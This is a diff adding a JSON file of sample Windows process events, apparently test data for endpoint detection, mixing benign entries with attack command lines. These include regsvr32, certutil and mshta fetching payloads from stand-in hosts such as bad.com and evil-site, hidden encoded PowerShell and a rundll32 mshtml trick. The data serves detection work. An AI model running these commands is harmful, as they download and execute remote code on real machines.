@@ -1,0 +1,72 @@
+[
+    {
+        "ProcessName": "powershell.exe",
+        "ParentProcess": "cmd.exe",
+        "CommandLine": "powershell -nop -w hidden -enc SQBFAFgAKAAoACkA",
+        "Image": "C:\\Users\\Public\\evil.ps1",
+        "DestinationIp": "45.67.89.10"
+    },
+    {
+        "ProcessName": "regsvr32.exe",
+        "ParentProcess": "explorer.exe",
+        "CommandLine": "regsvr32 /s /u http://malicious.site/file.sct",
+        "Image": "C:\\Windows\\System32\\regsvr32.exe",
+        "DestinationIp": "201.33.77.90"
+    },
+    {
+        "ProcessName": "cmd.exe",
+        "ParentProcess": "winword.exe",
+        "CommandLine": "cmd.exe /c powershell -nop -w hidden Invoke-WebRequest",
+        "Image": "C:\\Windows\\System32\\cmd.exe",
+        "DestinationIp": "172.16.1.5"
+    },
+    {
+        "ProcessName": "wscript.exe",
+        "ParentProcess": "outlook.exe",
+        "CommandLine": "wscript.exe C:\\Users\\Public\\script.vbs",
+        "Image": "C:\\Windows\\System32\\wscript.exe",
+        "DestinationIp": "156.54.23.11"
+    },
+    {
+        "ProcessName": "explorer.exe",
+        "ParentProcess": "services.exe",
+        "CommandLine": "explorer.exe",
+        "Image": "C:\\Windows\\explorer.exe",
+        "DestinationIp": "192.168.0.10"
+    },
+    {
+        "ProcessName": "rundll32.exe",
+        "ParentProcess": "explorer.exe",
+        "CommandLine": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\"",
+        "Image": "C:\\Windows\\System32\\rundll32.exe",
+        "DestinationIp": "99.44.123.8"
+    },
+    {
+        "ProcessName": "chrome.exe",
+        "ParentProcess": "explorer.exe",
+        "CommandLine": "chrome.exe https://github.com",
+        "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+        "DestinationIp": "192.168.1.25"
+    },
+    {
+        "ProcessName": "certutil.exe",
+        "ParentProcess": "powershell.exe",
+        "CommandLine": "certutil.exe -urlcache -split -f http://bad.com/payload.exe payload.exe",
+        "Image": "C:\\Windows\\System32\\certutil.exe",
+        "DestinationIp": "203.0.113.50"
+    },
+    {
+        "ProcessName": "mshta.exe",
+        "ParentProcess": "explorer.exe",
+        "CommandLine": "mshta http://evil-site/payload.hta",
+        "Image": "C:\\Windows\\System32\\mshta.exe",
+        "DestinationIp": "185.200.12.45"
+    },
+    {
+        "ProcessName": "excel.exe",
+        "ParentProcess": "explorer.exe",
+        "CommandLine": "excel.exe C:\\Users\\Public\\invoice.xlsm",
+        "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\excel.exe",
+        "DestinationIp": "8.8.8.8"
+    }
+]
